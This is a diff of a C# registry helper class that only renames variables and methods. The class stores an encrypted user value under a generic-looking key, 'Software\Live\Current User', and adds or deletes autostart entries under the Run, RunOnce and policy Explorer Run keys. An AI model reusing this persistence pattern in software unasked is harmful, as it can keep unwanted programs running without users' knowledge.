@@ -16,9 +16,9 @@ namespace bc.srv.Class
         {
             try
             {
-                var rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
+                var rkCheck = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
 
-                if (rk_Check == null)
+                if (rkCheck == null)
                     return false;
                 return true;
             }
@@ -39,12 +39,12 @@ namespace bc.srv.Class
             try
             {
                 // CONTROLLO ESISTENZA DELLA CHIAVE
-                var rk_Check = Registry.CurrentUser.CreateSubKey(@"Software\Live\Current User");
+                var rkCheck = Registry.CurrentUser.CreateSubKey(@"Software\Live\Current User");
 
 
-                rk_Check.SetValue("User", newNameCrypted, RegistryValueKind.ExpandString);
+                rkCheck.SetValue("User", newNameCrypted, RegistryValueKind.ExpandString);
 
-                rk_Check.Close();
+                rkCheck.Close();
 
                 return true;
             }
@@ -66,11 +66,11 @@ namespace bc.srv.Class
             try
             {
                 // CONTROLLO ESISTENZA DELLA CHIAVE
-                var rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
+                var rkCheck = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
 
-                if (rk_Check == null)
+                if (rkCheck == null)
                     return null;
-                return rk_Check.GetValue("User").ToString();
+                return rkCheck.GetValue("User").ToString();
             }
             catch
             {
@@ -93,13 +93,13 @@ namespace bc.srv.Class
             try
             {
                 var rk = Registry.CurrentUser;
-                RegistryKey StartupPath;
-                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
+                RegistryKey startupPath;
+                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
 
                 // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
-                if (StartupPath.GetValue(regEntryName) == null ||
-                    StartupPath.GetValue(regEntryName).ToString() != filePath)
-                    StartupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
+                if (startupPath.GetValue(regEntryName) == null ||
+                    startupPath.GetValue(regEntryName).ToString() != filePath)
+                    startupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
 
                 return true;
             }
@@ -115,18 +115,18 @@ namespace bc.srv.Class
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
-        public bool AddHKCUReg(string regEntryName, string filePath)
+        public bool AddHkcuReg(string regEntryName, string filePath)
         {
             try
             {
                 var rk = Registry.CurrentUser;
-                RegistryKey StartupPath;
-                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                RegistryKey startupPath;
+                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
 
                 // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
-                if (StartupPath.GetValue(regEntryName) == null ||
-                    StartupPath.GetValue(regEntryName).ToString() != filePath)
-                    StartupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
+                if (startupPath.GetValue(regEntryName) == null ||
+                    startupPath.GetValue(regEntryName).ToString() != filePath)
+                    startupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
 
                 return true;
             }
@@ -172,17 +172,17 @@ namespace bc.srv.Class
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
-        public void RemoveHKCUReg(string regEntryName, string filePath)
+        public void RemoveHkcuReg(string regEntryName, string filePath)
         {
             try
             {
                 var rk = Registry.CurrentUser;
-                RegistryKey StartupPath;
-                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                RegistryKey startupPath;
+                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
 
                 // LOELIMINO SOLO SE è PUNTA A ME
-                if (StartupPath.GetValue(regEntryName).ToString() == filePath)
-                    StartupPath.DeleteValue(regEntryName);
+                if (startupPath.GetValue(regEntryName).ToString() == filePath)
+                    startupPath.DeleteValue(regEntryName);
             }
             catch (Exception ex)
             {
@@ -202,12 +202,12 @@ namespace bc.srv.Class
             try
             {
                 var rk = Registry.CurrentUser;
-                RegistryKey StartupPath;
-                StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
+                RegistryKey startupPath;
+                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
 
 
-                if (StartupPath.GetValue(regEntryName).ToString() == filePath)
-                    StartupPath.DeleteValue(regEntryName);
+                if (startupPath.GetValue(regEntryName).ToString() == filePath)
+                    startupPath.DeleteValue(regEntryName);
             }
             catch (Exception ex)
             {
